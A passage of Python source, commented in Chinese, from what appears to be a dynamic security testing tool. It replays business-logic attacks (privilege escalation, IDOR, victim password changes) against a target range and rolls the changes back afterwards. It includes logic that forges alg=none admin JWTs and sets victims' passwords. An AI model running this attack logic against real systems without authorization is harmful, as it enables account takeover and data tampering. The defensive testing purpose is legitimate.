        if not state_query_applicable(cfg):
            return None
        headers = dict(account.get("auth_headers") or {})
        cookies = dict(account.get("auth_cookies") or {})

        cands = [str(cfg.get("endpoint") or "").lstrip("/")]
        extra = [str(c).lstrip("/") for c in (cfg.get("candidates") or []) if str(c).strip()]
        for c in extra:
            if c not in cands:
                cands.append(c)
        budget = max(1, int(candidate_budget or 0)) or len(cands)
        for ep in cands[:budget]:
            m = str(cfg.get("method") or "GET").upper() or "GET"
            url = _uj(base_url + "/", ep) if base_url else ("/" + ep)
            try:
                resp = requests.request(m, url, headers=headers, cookies=cookies,
                                        timeout=10, allow_redirects=False)
                if resp.status_code < 200 or resp.status_code >= 300:
                    logger.debug("[D1.snapshot] 状态读端点 %s 非 2xx（%s），换候选",
                                 ep, resp.status_code)
                    continue
                snap = extract_state_fields(resp.text, cfg)
            except Exception as _e:
                logger.debug("[D1.snapshot] 状态快照失败（跳过差分）：%s", _e)
                continue
            if snap is None:
                logger.debug("[D1.snapshot] 状态读端点 %s 形状不可解析，换候选", ep)
                continue
            if snap:
                return snap
        return None

    @staticmethod
    def _diff_observable_state(before: Optional[Dict[str, Any]], after: Optional[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
        """before/after 快照按 key 差分，返回 {changed, deltas}。两者任一非 dict → None（不差分）。"""
        if not isinstance(before, dict) or not isinstance(after, dict):
            return None
        deltas = {}
        for k in (set(before) | set(after)):
            b, a = before.get(k), after.get(k)
            if b != a:
                deltas[k] = {"before": b, "after": a}
        if not deltas:
            return {"changed": False, "deltas": {}}
        return {"changed": True, "deltas": deltas}

    # ------------------------------------------------------------------ 业务逻辑漏洞运行时验证#
    def _assemble(self, target: Dict[str, Any], spec: Dict[str, Any],
                  extra_injections: Optional[List[tuple]] = None) -> tuple:
        """由 target + trigger_spec 组装一次 HTTP 请求要素，复用 _send_one 发送。

        spec 支持：target_endpoint / http_method / param_name / param_location / param_value
        (或 taint_marker) / body / content_type / auth_context。extra_injections 为
        [(pname, ploc, pval), ...] 追加注入（如计算逻辑变异数值）。
        """
        self._apply_endpoint_schema(spec)
        base_url = str(target.get("service_url") or "").rstrip("/")
        endpoint = str(spec.get("target_endpoint") or "").lstrip("/")
        method = str(spec.get("http_method") or "GET").upper()
        auth = target.get("auth_context") or spec.get("auth_context") or {}
        if not isinstance(auth, dict):
            auth = {}
        headers = dict(auth.get("auth_headers") or {})
        cookies = dict(auth.get("auth_cookies") or {})
        query: Dict[str, str] = {}
        body_holder = [spec.get("body")]
        path_holder = [endpoint]

        def _inject(pname: str, ploc: str, pval: Any) -> None:
            ploc = str(ploc or "query").lower()
            if not pname:
                return
            if ploc == "query":
                query[pname] = str(pval)
            elif ploc == "header":
                headers[pname] = str(pval)
            elif ploc == "cookie":
                cookies[pname] = str(pval)
            elif ploc in ("body", "form"):
                body_holder[0] = body_holder[0] or {}
                body_holder[0][pname] = pval
            elif ploc == "path":
                path_holder[0] = path_holder[0].replace("{" + pname + "}", str(pval)).replace(":" + pname, str(pval))

        pname = spec.get("param_name")
        if pname:
            pval = spec.get("param_value") if "param_value" in spec else spec.get("taint_marker", "")
            _inject(pname, spec.get("param_location", "query"), pval)
        for inj in (extra_injections or []):
            _inject(inj[0], inj[1], str(inj[2]))

        body = body_holder[0]
        path = path_holder[0]
        # 以 "/" 开头的相对 URL 一律按「绝对路径」处理 ⇒ 直接丢弃 base_url 的 context path。
        # 而带前缀的 /benchmark/xss-00/... 是 200 且原样反射。⇒ 重放 100% 打在 404 上，
        # servlet 根本不执行、sink 不触发，arrivals 自然恒 0（事件表里只剩 Tomcat 404 页的
        # Response.setHeader）。同文件 817/850/2368/2385/2455 早已用 .lstrip("/")，仅 spec
        # 驱动的这几处漏了 —— 补齐，与既有写法和 urljoin 语义对齐。
        url = _join_url(base_url, path)
        return method, url, query, headers, cookies, body, str(spec.get("content_type") or "")

    @staticmethod
    def _denied(body_text: str) -> bool:
        return any(w in (body_text or "").lower() for w in D1Service.DENY_WORDS)

    def _ai_overlay_judgement(self, category: str, spec: Dict[str, Any], impact) -> Optional[bool]:
        """best-effort AI 语义复核：对 D1 重放结果做业务语义研判，返回 True/False 或 None。

        返回 None 表示「AI 不可用/失败」——调用方必须回落到既有启发式判定，绝不因 AI
        不可用而改变确定性重放行为。仅当 self.gateway 在线时尝试；任何异常都回退 None。
        这是 D1「操作器」之上的可选语义增强，不改变重放本身的确定性（可复现/可审计）。
        """
        if self.gateway is None or getattr(self.gateway, "is_offline", True):
            return None
        try:
            import json as _json
            import re as _re
            body_text = (getattr(impact, "body", "") or "")[:1200]
            prompt = (
                "你是 DAST 业务语义裁决辅助。给定一次「业务逻辑漏洞运行时重放」的请求与响应，"
                "判断响应是否确证了该漏洞（true=确证漏洞存在 / false=未确证或属正常拒绝）。\n"
                f"漏洞类别: {category}\n"
                f"请求端点: {spec.get('http_method', '')} {spec.get('target_endpoint', '')}\n"
                f"HTTP 状态: {getattr(impact, 'status_code', '')}\n"
                f"响应摘要: {body_text}\n"
                "只返回 JSON: {\"verdict\": true或false, \"reason\": \"一句话\"}。不要解释。"
            )
            resp = self.gateway.complete(purpose="d1-ai-overlay", prompt=prompt, context={"category": category})
            text = resp.text or ""
            m = _re.search(r"\{.*\}", text, _re.DOTALL)
            if not m:
                return None
            data = _json.loads(m.group(0))
            v = data.get("verdict")
            if isinstance(v, bool):
                return v
            if str(v).lower() in ("true", "1"):
                return True
            if str(v).lower() in ("false", "0"):
                return False
            return None
        except Exception:
            return None

    @staticmethod
    def _apply_endpoint_schema(spec: Dict[str, Any]) -> None:
        """P0-4：若 spec 无 body 且 endpoint 命中 _ENDPOINT_REQUEST_SCHEMAS，就地注入合法表单字段。

        把请求装配到「可被靶场接收」的形态（x-www-form-urlencoded + 真实 @RequestParam 字段名），
        否则这些多字段 POST 端点会因缺字段返回 400/无响应，被误读成"端点已做鉴权拒绝"。
        不臆造确认结果——是否 confirmed 由靶场实际鉴权/业务逻辑决定。
        """
        if spec.get("body"):
            return
        endpoint = str(spec.get("target_endpoint") or "").rstrip("/")
        sch = _ENDPOINT_REQUEST_SCHEMAS.get(endpoint)
        if not sch:
            return
        if str(spec.get("http_method") or "POST").upper() != str(sch.get("method", "POST")).upper():
            return
        spec["body"] = dict(sch.get("fields", {}))
        spec["content_type"] = sch.get("content_type")

    @staticmethod
    def _classify_request_state(status_code: Optional[int], reached: bool,
                                headers: Optional[Dict[str, str]] = None) -> str:
        """把重放响应归类为可读状态，避免把「请求装配不完整(400/415)」误判成「服务端做了鉴权拒绝(401/403)」。

        - accepted: 2xx（请求被接受）
        - auth_missing: 401 且响应带 `WWW-Authenticate` 挑战头——这是服务端「你没登录，来认证」的
          标准鉴权墙（缺凭证），预期行为，不是「攻击被 WAF/过滤器拦截」。路由到双账户重放
          （attacker/victim 登录态并发），不当 blocked。
        - auth_denied: 403 已登录但无权限；或 401 但**无** WWW-Authenticate（非标准挑战，按被拦截处理）。
        - malformed_request: 400/405/406/415/422（缺必需字段/值或 Content-Type 错误，属请求本身不合法，
          不等于控制存在——此时不应解读为「端点已做拒绝控制」）
        - server_error: 5xx
        - no_response: 超时/连接失败（reached=False）
        """
        if not reached or status_code is None:
            return "no_response"
        sc = int(status_code)
        if 200 <= sc < 300:
            return "accepted"
        # Q6（净化器判定九问）：401 + 标准鉴权挑战头 → 鉴权墙（缺凭证），走双账户重放而非被拦截。
        if sc == 401 and headers and any(str(k).lower() == "www-authenticate" for k in (headers or {})):
            return "auth_missing"
        if sc in (401, 403):
            return "auth_denied"
        if sc in (400, 405, 406, 415, 422):
            return "malformed_request"
        if 500 <= sc < 600:
            return "server_error"
        return "other"

    def _verify_accepted(self, spec: Dict[str, Any], target: Dict[str, Any], accounts: Any = None,
                         category: Optional[str] = None) -> Dict[str, Any]:
        """通用「未授权请求被服务端接受」判定：构造请求→发送→2xx 且无拒绝词即视为缺失控制。

        垂直越权 / 跨模块越权 / 状态机 / 认证会话 的运行时验证共用此核心。
        可选 category 触发 AI 语义复核（best-effort）：当且仅当 AI 在线且返回明确判定时，
        以 AI 结论覆盖启发式 confirmed，同时保留 heuristic_confirmed 供审计对比。

        R9（P0-4）修正：额外返回 request_state，明确区分「鉴权拒绝(auth_denied)」与
        「请求装配不完整(malformed_request)」，避免把 400 误读成端点已做拒绝控制。
        """
        spec = dict(spec or {})
        target = dict(target or {})
        attacker = (accounts or {}).get("attacker") if isinstance(accounts, dict) else (accounts[0] if accounts else {})
        auth = attacker or target.get("auth_context") or spec.get("auth_context") or {}
        spec = {**spec, "auth_context": auth}
        method, url, query, headers, cookies, body, ct = self._assemble(target, spec)
        impact = self._send_one(method, url, query, headers, cookies, body, ct)
        request_state = self._classify_request_state(impact.status_code, impact.reached, impact.headers)
        heuristic = bool(
            impact.reached and impact.status_code and 200 <= int(impact.status_code) < 300
            and not self._denied(impact.body or "")
        )
        ai = self._ai_overlay_judgement(category, spec, impact) if category else None
        confirmed = ai if ai is not None else heuristic
        return {"impact": impact, "confirmed": confirmed, "heuristic_confirmed": heuristic,
                "ai_overlay": ai, "request_state": request_state}

    # ---------------- A1 主腿：垂直越权 alg=none 伪造工具 ----------------
    @staticmethod
    def _forge_account_token(account: Optional[Dict[str, Any]], role: str = "admin") -> Optional[Dict[str, Any]]:
        """把账户里的 JWT（Bearer 头或 mall_token cookie）改写成 alg=none + role 的伪造令牌。

        role claim 被后端直接采用（不查库），故 alg=none+role=admin 是真实可用的攻击载荷，而非占位数据。
        非 JWT（无 '.' 分隔）原样返回 None。
        """
        if not isinstance(account, dict) or not account:
            return None
        try:
            from src.iast.account_discovery import forge_none_alg_jwt
        except Exception:
            return None
        forged = dict(account)
        headers = dict(account.get("auth_headers") or {})
        for hname, hval in list(headers.items()):
            if isinstance(hval, str) and hval.lower().startswith("bearer "):
                tok = hval.split(" ", 1)[1]
                f = forge_none_alg_jwt(tok, extra_claims={"role": role})
                forged["auth_headers"] = {**headers, hname: f"Bearer {f}"}
                return forged
        cookies = dict(account.get("auth_cookies") or {})
        for cname, cval in list(cookies.items()):
            if cval:
                f = forge_none_alg_jwt(str(cval), extra_claims={"role": role})
                forged["auth_cookies"] = {**cookies, cname: f}
                return forged
        return None

    def _forge_accounts(self, accounts: Any) -> Optional[Dict[str, Any]]:
        """仅把 attacker 账户替换为 alg=none 伪造令牌，victim 不变；返回新 accounts 或 None（无法伪造）。"""
        if not isinstance(accounts, dict):
            return None
        attacker = accounts.get("attacker")
        if not isinstance(attacker, dict) or not attacker:
            return None
        forged_attacker = self._forge_account_token(attacker, role="admin")
        if forged_attacker is None:
            return None
        out = dict(accounts)
        out["attacker"] = forged_attacker
        return out

    # ---------------- B 门禁：victim 身份解析落地 ----------------
    def _resolve_victim_identity(self, target: Dict[str, Any], spec: Dict[str, Any],
                                 accounts: Any) -> Dict[str, Any]:
        """B 门禁：重放期把哨兵/空 victim 解析成真实受害者资源 id 与强指纹，解锁 data_leak 腿。

        - 强指纹只取 victim username/email（短数字 uid 由 filter_identity_markers 过滤，避免全响应假命中）。
        - victim 资源 id：优先用 victim 账户枚举其名下对象；命中 /profile/update 自提升场景则用攻击者自身 uid；
          仍取不到回退 attacker 枚举或 "1"。
        - 解析结果脱敏回写 spec（victim_resource_id + victim_identifiers），供报告/回归。
        """
        from src.core.identity_marker import filter_identity_markers
        spec = spec or {}
        accounts = accounts if isinstance(accounts, dict) else {}
        victim_acct = accounts.get("victim") or {}
        attacker_acct = accounts.get("attacker") or {}
        base_url = str((target or {}).get("service_url") or "").rstrip("/")
        endpoint = str(spec.get("target_endpoint") or "").lstrip("/")

        # spec.victim_identifiers 是登记期/A2 已解析好的受害者强指纹（由 IastService
        # .update_trigger_spec_victim_identifiers 回填，见本文件另一处调用），必须并入。
        # 此前本函数只读 victim_acct：重放期 accounts 常常只带 attacker，
        # 响应体里明明含 victim@corp.com，leaked 仍算成 []，confirmed 判 False。
        _acct_values = [
            victim_acct.get(k) for k in ("username", "user_name", "email", "user_id", "userid", "uid")
        ] if isinstance(victim_acct, dict) else []
        victim_markers = filter_identity_markers(
            list(spec.get("victim_identifiers") or []) + _acct_values)
        attacker_markers = filter_identity_markers([
            attacker_acct.get(k) for k in ("username", "user_name", "email", "user_id", "userid", "uid")
        ]) if isinstance(attacker_acct, dict) else []

        # 前导斜杠必须补回：endpoint 上面已 lstrip("/")，
        # 否则 "/profile/update" in "profile/update" 恒为 False，这些分支从来没生效过。
        ep = "/" + endpoint.lower().lstrip("/")
        vid = str(spec.get("victim_resource_id") or "").strip()
        if "/profile/update" in ep:
            # 自提升一律以攻击者为对象，不看 spec 上登记的 victim_resource_id：
            # 那个值常常是受害者(admin)，照它回滚会出现「投放打攻击者、回滚打受害者」的错位，
            # 把改动留在靶标上。
            vid = self._self_elevation_uid(
                base_url, accounts,
                dict((attacker_acct or {}).get("auth_headers") or {}),
                dict((attacker_acct or {}).get("auth_cookies") or {}))
        elif vid == "VICTIM_FROM_POOL" or not vid:
            vid = ""
            _ploc = str(spec.get("param_location") or "").lower()
            _pname = str(spec.get("param_name") or "").lower()
            # 身份类参数（uid/userId/email/account 等）：值即账户 uid，可直接用池 uid；
            # 资源类参数（id/orderId/cartItemId 等）：值须是真实对象 id，必须枚举，绝不能填 user_id。
            _IDENTITY_PARAMS = {"uid", "userid", "user_id", "userId", "username",
                                "email", "account", "account_id", "accountid"}
            _is_identity = _pname in _IDENTITY_PARAMS
            if "/profile/password" in ep:
                # 越权改密：对象是受害者（攻击者改受害者的密码）
                vid = str((victim_acct or attacker_acct or {}).get("user_id") or "")
                if not vid:
                    vid = self._resolve_uid_by_username(
                        base_url, str((victim_acct or {}).get("username") or ""),
                        dict((attacker_acct or {}).get("auth_headers") or {}),
                        dict((attacker_acct or {}).get("auth_cookies") or {}))
            if not vid and _is_identity:
                # 身份类参数：直接用账户池 uid（victim 优先，其次 attacker），优于盲投 "1"
                # 资源类参数如 cartItemId/orderId 仍需枚举真实对象 id，见
                # test_non_path_sentinel_uses_pool_uid 与 test_19_cart_remove_side_effect）。
                vid = str((victim_acct or {}).get("user_id")
                          or (attacker_acct or {}).get("user_id") or "")
            if not vid:
                # 资源类 path/query 参数（及身份参数取不到池 uid 时）：枚举真实对象 id。
                # 无需 auth 也可尝试公开列表端点，故不再以 `vh or vc` 为空为门槛跳过枚举，
                # 否则空账户 + path 型永远退化盲投 "1"，丢失真实枚举 id
                # （见 test_path_shaped_sentinel_enumerates_real_object_id）。
                # 枚举按 victim→attacker 顺序尝试，取首个非 "1" 的真实 id；都失败才退化为 "1"。
                _enum_cands = []
                if isinstance(victim_acct, dict):
                    _enum_cands.append((dict(victim_acct.get("auth_headers") or {}),
                                        dict(victim_acct.get("auth_cookies") or {})))
                if isinstance(attacker_acct, dict):
                    _enum_cands.append((dict(attacker_acct.get("auth_headers") or {}),
                                        dict(attacker_acct.get("auth_cookies") or {})))
                for _h, _c in _enum_cands:
                    _got = self._resolve_object_id(base_url, endpoint, _h, _c)
                    if _got and _got != "1":
                        vid = _got
                        break
                if not vid and _enum_cands:
                    vid = "1"
            if not vid:
                vid = "1"
        if vid and spec.get("id") is not None and self.db is not None:
            try:
                from src.iast.service import IastService
                IastService(self.db).update_trigger_spec_victim_identifiers(
                    int(spec["id"]), victim_markers, victim_resource_id=vid)
            except Exception as _e:
                logger.warning("[D1.victim] 回填 victim 标识失败（忽略）：%s", _e)
        return {"victim_resource_id": vid, "victim_markers": victim_markers, "attacker_markers": attacker_markers}

    # ---------------- A2：IDOR/bola 可观测副作用差分 ----------------
    # 因此结构上不可能 confirmed。这两类的共同点是「把标量字段写到可定位资源上」，故可安全验证：
    # 投放前取基线 → 投放 → 无条件写回基线 → 复读校验；任一步拿不到就不许投放或不得判 confirmed。
    # 端点形态取自靶场 Controller 真实签名（ProfileController.update 的 @RequestParam Map +
    # UserMapper.updateFull 写全字段），与既有 _ENDPOINT_REQUEST_SCHEMAS 同一来源，不是猜测。
    _PROFILE_SNAPSHOT_TPL = "api/profile/{rid}"
    _PROFILE_RESTORE_EP = "profile/update"
    _PROFILE_RESTORE_FIELDS = ("username", "password", "role", "email", "phone",
                               "nickname", "signature", "isVip", "balance", "avatar")

    @staticmethod
    def _restore_target_rid(accounts: Any, spec: Dict[str, Any]) -> str:
        """回滚目标的资源 id：优先 victim 的真实 user_id，其次 spec 上已解析的 victim_resource_id。

        VICTIM_FROM_POOL 只是登记期占位（坑⑪），不能当真实 id 用，否则回滚会打到错的对象上。
        """
        accts = accounts if isinstance(accounts, dict) else {}
        for who in ("victim", "attacker"):
            a = accts.get(who) or {}
            if not isinstance(a, dict):
                continue
            for k in ("user_id", "uid", "id"):
                v = a.get(k)
                if v not in (None, "", "VICTIM_FROM_POOL"):
                    return str(v)
        v = (spec or {}).get("victim_resource_id")
        if v not in (None, "", "VICTIM_FROM_POOL"):
            return str(v)
        return ""

    @staticmethod
    def _restore_secondary_rid(accounts: Any, spec: Dict[str, Any], primary_rid: str) -> str:
        """兜底还原对象：与 primary 不同的另一侧账户（越权类打受害者、自提升打自己，
        两侧都还原才能避免任一侧残留持久变更）。"""
        accts = accounts if isinstance(accounts, dict) else {}
        cands = []
        for who in ("victim", "attacker"):
            a = accts.get(who) or {}
            if not isinstance(a, dict):
                continue
            for k in ("user_id", "uid", "id"):
                v = a.get(k)
                if v not in (None, "", "VICTIM_FROM_POOL"):
                    cands.append(str(v))
                    break
        v = (spec or {}).get("victim_resource_id")
        if v not in (None, "", "VICTIM_FROM_POOL"):
            cands.append(str(v))
        for c in cands:
            if c and c != primary_rid:
                return c
        return ""

    def _profile_snapshot(self, target: Dict[str, Any], accounts: Any, rid: str) -> Optional[Dict[str, Any]]:
        """读回用户对象快照。读不到返回 None —— 调用方据此放弃投放，绝不带伤上阵。"""
        from urllib.parse import urljoin
        base_url = str((target or {}).get("service_url") or "").rstrip("/")
        if not base_url or not rid:
            return None
        accts = accounts if isinstance(accounts, dict) else {}
        acct = accts.get("attacker") or {}
        headers = dict(acct.get("auth_headers") or {})
        cookies = dict(acct.get("auth_cookies") or {})
        url = urljoin(base_url + "/", self._PROFILE_SNAPSHOT_TPL.format(rid=rid))
        try:
            resp = self._send_one("GET", url, {}, headers, cookies, None, "")
        except Exception as exc:  # noqa: BLE001
            logger.warning("[R26.restore] 基线快照读取失败（按无基线处理）：%s", exc)
            return None
        if resp is None or not resp.reached or not resp.body:
            return None
        try:
            data = json.loads(resp.body)
        except Exception:  # noqa: BLE001
            return None
        return data if isinstance(data, dict) else None

    def _profile_restore(self, target: Dict[str, Any], accounts: Any, rid: str,
                         baseline: Dict[str, Any]) -> "tuple[bool, str]":
        """把基线字段写回并复读校验。返回 (ok, detail)，ok 为假时必须按 failure 处理。"""
        from urllib.parse import urljoin
        base_url = str((target or {}).get("service_url") or "").rstrip("/")
        if not base_url or not rid:
            return False, "缺少 base_url 或资源 id，未执行回滚"
        accts = accounts if isinstance(accounts, dict) else {}
        acct = accts.get("attacker") or {}
        headers = dict(acct.get("auth_headers") or {})
        cookies = dict(acct.get("auth_cookies") or {})
        params: Dict[str, str] = {"id": rid}
        for k in self._PROFILE_RESTORE_FIELDS:
            v = baseline.get(k)
            if v is None:
                continue
            params[k] = "true" if v is True else ("false" if v is False else str(v))
        url = urljoin(base_url + "/", self._PROFILE_RESTORE_EP)
        try:
            self._send_one("POST", url, {}, headers, cookies, params,
                           "application/x-www-form-urlencoded")
        except Exception as exc:  # noqa: BLE001
            return False, "回滚请求异常：%s" % exc
        now = self._profile_snapshot(target, accounts, rid)
        if not now:
            return False, "回滚后复读失败，无法确认是否已还原"
        diff = [k for k in self._PROFILE_RESTORE_FIELDS
                if k in baseline and str(baseline.get(k)) != str(now.get(k))]
        if diff:
            return False, "回滚后仍有字段与基线不一致：%s" % ",".join(diff)
        return True, "已回滚并复读校验一致"

    def _resolve_uid_by_username(self, base_url: str, username: str,
                                 headers: Optional[Dict[str, str]] = None,
                                 cookies: Optional[Dict[str, str]] = None,
                                 max_id: int = 10) -> str:
        """按 username 反查数字 uid。账户配置常常只给 username，没有 user_id。

        用已存在的读回端点逐个探（命中即返回，范围很小），失败返回 ""（调用方回落旧行为）。
        """
        from urllib.parse import urljoin
        if not base_url or not username:
            return ""
        for n in range(1, max_id + 1):
            url = urljoin(base_url + "/", self._PROFILE_SNAPSHOT_TPL.format(rid=n))
            try:
                resp = self._send_one("GET", url, {}, headers or {}, cookies or {}, None, "")
            except Exception:  # noqa: BLE001
                return ""
            if resp is None or not resp.reached or not resp.body:
                continue
            try:
                data = json.loads(resp.body)
            except Exception:  # noqa: BLE001
                continue
            if isinstance(data, dict) and str(data.get("username") or "") == str(username):
                return str(n)
        return ""

    def _self_elevation_uid(self, base_url: str, accounts: Any,
                            headers: Optional[Dict[str, str]] = None,
                            cookies: Optional[Dict[str, str]] = None) -> str:
        """批量赋值自提升的投放对象 = 攻击者自己的 uid。

        自提升是「给自己提权」：拿受害者当对象时受害者常常本来就是 ADMIN，
        role 差分恒为无变化 → #25 永远不确认。账户只给 username 时按 username 反查。
        投放对象与回滚对象必须用同一个 uid，否则会把改动留在靶标上。
        """
        accts = accounts if isinstance(accounts, dict) else {}
        attacker = accts.get("attacker") or {}
        victim = accts.get("victim") or {}
        if not isinstance(attacker, dict):
            attacker = {}
        if not isinstance(victim, dict):
            victim = {}
        uid = str(attacker.get("user_id") or attacker.get("uid") or "")
        if not uid:
            uid = self._resolve_uid_by_username(base_url, str(attacker.get("username") or ""),
                                                headers, cookies)
        if not uid:
            uid = str(victim.get("user_id") or "")
        return uid or "1"

    @contextmanager
    def restorable_profile(self, target: Dict[str, Any], accounts: Any, spec: Dict[str, Any]):
        """可回滚验证上下文：进入时取基线，退出时无条件回滚并复读校验。

        用法：
            with svc.restorable_profile(target, accounts, spec) as st:
                if not st["baseline"]:
                    return 未确认（缺基线，绝不投放）
                res = dispatch(...)
            # 退出后 st["restored"] / st["note"] 才是最终值，需在 with 外再挂到 res 上。
        """
        st: Dict[str, Any] = {"rid": "", "rids": [], "baselines": {}, "canonical": {},
                              "restored": None, "note": "", "baseline": None}
        # 可重入：verify 里也有同一层包装（业务族经 _replay_business_logic 进来）。
        # 内层直接复用外层状态，不重复取快照、不重复回滚 —— 否则内层会把「已投放」当成基线。
        _outer = getattr(_RESTORE_TLS, "state", None)
        if _outer is not None:
            yield _outer
            return
        # 主回滚对象（决定「是否放行投放」）：与 replay_* 同一条 B 门禁语义。
        # 自提升/批量赋值（/profile/update）投放在攻击者自己身上，主对象必须是攻击者，
        # 否则门禁会因受害者快照取不到而误拦，且真正被改动的攻击者账户反而得不到还原。
        accts = accounts if isinstance(accounts, dict) else {}
        _att = accts.get("attacker") or {}
        _att_h = dict(_att.get("auth_headers") or {}) if isinstance(_att, dict) else {}
        _att_c = dict(_att.get("auth_cookies") or {}) if isinstance(_att, dict) else {}
        base_url = str((target or {}).get("service_url") or "").rstrip("/")
        ep = "/" + str((spec or {}).get("target_endpoint") or "").lstrip("/").lower()
        if "/profile/update" in ep:
            primary_rid = self._self_elevation_uid(base_url, accounts, _att_h, _att_c)
        else:
            primary_rid = self._restore_target_rid(accounts, spec)
            if not primary_rid:
                # 账户配置常常只有 username，取不到 id —— 回落到与 replay_* 同一条 B 门禁解析，
                # 保证「回滚对象 == 实际投放对象」（否则取不到基线就不投放，白白丢掉可验证项）。
                try:
                    _vres = self._resolve_victim_identity(target, spec, accounts) or {}
                    primary_rid = str(_vres.get("victim_resource_id") or "").strip()
                except Exception as _exc:  # noqa: BLE001
                    logger.warning("[R26.restore] 回滚对象解析失败：%s", _exc)
                    primary_rid = ""
        # 次回滚对象：另一侧账户（与 primary 不同的那个 user_id），两侧都兜底还原，
        secondary_rid = self._restore_secondary_rid(accounts, spec, primary_rid)
        rids = []
        for r in (primary_rid, secondary_rid):
            if r and r not in rids:
                rids.append(r)
        st["rid"] = primary_rid
        st["rids"] = rids
        # 进入时逐 rid 取基线 + 规范化（带漂移自愈）。
        for rid in rids:
            key = _canon_key(str((target or {}).get("service_url") or ""), rid)
            live = self._profile_snapshot(target, accounts, rid)
            st["baselines"][rid] = live  # 单个 rid 的快照仍用于「无基线不投放」判断
            if not live:
                logger.warning("[R26.restore] 未取得可回滚基线（rid=%s），该账户本次不纳入还原", rid)
                continue
            with _CANONICAL_LOCK:
                if key not in _CANONICAL_BASELINE or _CANONICAL_BASELINE[key] is None:
                    _CANONICAL_BASELINE[key] = live
                st["canonical"][rid] = _CANONICAL_BASELINE[key]
            # 漂移自愈：进入前若现场已偏离规范化基线（前一次回滚失败遗留的污染），
            # 先强制还原到规范化基线再投放，避免后续把污染当基线。
            if st["canonical"][rid] and _profile_differs(live, st["canonical"][rid]):
                logger.warning("[R26.restore] 进入前检测到基线漂移 rid=%s，先强制还原再投放", rid)
                _canon_restore(self, target, accounts, rid, st["canonical"][rid])
        # 主对象基线（门禁用）：主对象取不到基线则不放行投放。
        st["baseline"] = st["baselines"].get(primary_rid)
        _RESTORE_TLS.state = st
        try:
            yield st
        finally:
            _RESTORE_TLS.state = None
            # 从而单次回滚失败 / 进入前已污染都不会把脏状态固化成新基线。
            results = []
            for rid in rids:
                base = st.get("canonical", {}).get(rid)
                if not base:
                    continue
                ok, detail = _canon_restore(self, target, accounts, rid, base)
                results.append((rid, bool(ok), detail))
                if not ok:
                    logger.error("[R26.restore] 回滚失败！靶标可能残留本次验证造成的持久变更："
                                 "rid=%s detail=%s", rid, detail)
            if results:
                st["restored"] = all(ok for _, ok, _ in results)
                st["note"] = "; ".join(
                    ("rid=%s 已还原" % r) if ok else ("rid=%s 还原失败:%s" % (r, d)) for r, ok, d in results
                )
            else:
                st["restored"] = None
                st["note"] = "无可回滚基线"

    def _idor_readback_plan(self, spec: Dict[str, Any], victim_resource_id: str, attacker_uid: str,
                            new_password: Optional[str] = None) -> Optional[Dict[str, Any]]:
        """按端点语义规划「攻击前后读 victim 状态」的回读方案，供 before/after 差分。"""
        ep = str(spec.get("target_endpoint") or "").lower()
        if "/profile/password" in ep:
            return {"method": "login", "account": "victim", "mode": "login", "password": new_password}
        if "/address" in ep:
            return {"method": "GET", "endpoint": "/address/%s" % victim_resource_id,
                    "account": "victim", "mode": "victim_data"}
        if "/cart" in ep:
            return {"method": "GET", "endpoint": "/cart", "account": "victim", "mode": "cart_ids"}
        return None

    @staticmethod
    def _extract_ids(text: str) -> List[str]:
        """从集合响应（JSON 数组 / HTML）抽取数值 id 集合，best-effort。"""
        ids: List[str] = []
        try:
            data = json.loads(text)
            items = data if isinstance(data, list) else (data.get("items") or data.get("data") or [])
            if isinstance(items, list):
                for it in items:
                    if isinstance(it, dict):
                        for k in ("id", "cartItemId", "cartItemID", "itemId"):
                            v = it.get(k)
                            if v is not None:
                                ids.append(str(v))
                                break
        except Exception:
            pass
        if not ids:
            ids = re.findall(r"\b\d{1,12}\b", text or "")
        seen: set = set()
        out: List[str] = []
        for i in ids:
            if i not in seen:
                seen.add(i)
                out.append(i)
        return out

    def _read_victim_state(self, target: Dict[str, Any], spec: Dict[str, Any],
                           accounts: Any, plan: Optional[Dict[str, Any]]) -> Any:
        """按 readback 方案读 victim（或攻击者自身）资源状态，返回可比较的结构。"""
        if not isinstance(plan, dict):
            return None
        from urllib.parse import urljoin
        base_url = str((target or {}).get("service_url") or "").rstrip("/")
        accounts = accounts if isinstance(accounts, dict) else {}
        acct = accounts.get(plan.get("account") or "victim") or {}
        if plan.get("mode") == "login":
            uname = str(acct.get("username") or "")
            pwd = str(plan.get("password") or spec.get("param_value") or "PwnedBySAST@2026")
            return self._try_login(base_url, uname, pwd)
        headers = dict(acct.get("auth_headers") or {})
        cookies = dict(acct.get("auth_cookies") or {})
        endpoint = str(plan.get("endpoint") or "").lstrip("/")
        url = urljoin(base_url + "/", endpoint) if base_url else ("/" + endpoint)
        try:
            resp = self._send_one(plan.get("method") or "GET", url, {}, headers, cookies, None, "")
        except Exception:
            return None
        if resp is None or not resp.reached:
            return None
        text = resp.body or ""
        if plan.get("mode") == "json_role":
            try:
                data = json.loads(text)
                if isinstance(data, list) and data:
                    data = data[0]
                if isinstance(data, dict):
                    return {"role": str(data.get("role") or data.get("roleName") or "")}
            except Exception:
                return None
        if plan.get("mode") == "cart_ids":
            return {"ids": re.findall(r'name="id"\s+value="(\d+)"', text or "")}
        if plan.get("mode") == "victim_data":
            return {"body": text[:2000]}
        return None

    @staticmethod
    def _state_differs(before: Any, after: Any, victim_resource_id: str) -> bool:
        """比较 before/after 状态，判定可观测副作用是否发生。"""
        if before is None or after is None:
            return False
        if isinstance(before, bool) or isinstance(after, bool):
            return bool(before) is False and bool(after) is True
        if isinstance(before, dict) and isinstance(after, dict):
            if "role" in before and "role" in after:
                return str(before["role"]).upper() != str(after["role"]).upper()
            if "ids" in before and "ids" in after:
                return (victim_resource_id in before["ids"]) and (victim_resource_id not in after["ids"])
            if "body" in before and "body" in after:
                return before["body"] != after["body"]
        return False

    def _try_login(self, base_url: str, username: str, password: str) -> bool:
        """用 username+password 尝试登录，成功返回 True（改密后复登验证用）。"""
        if not base_url or not username:
            return False
        from urllib.parse import urljoin
        url = urljoin(base_url + "/", "login")
        try:
            resp = self._send_one("POST", url, {}, {}, {},
                                  {"username": username, "password": password},
                                  "application/x-www-form-urlencoded")
        except Exception:
            return False
        if resp is None or not resp.reached:
            return False
        # 失败返回 200 重新渲染登录页（含错误提示）。allow_redirects=False 下 302 直接可见。
        if resp.status_code == 302:
            return True
        text = (resp.body or "").lower()
        if resp.status_code == 200 and ("token" in text or "mall_token" in text):
            return True
        return False

    def replay_vertical(self, trigger_spec: Dict[str, Any], target: Dict[str, Any],
                        accounts: Any = None) -> Dict[str, Any]:
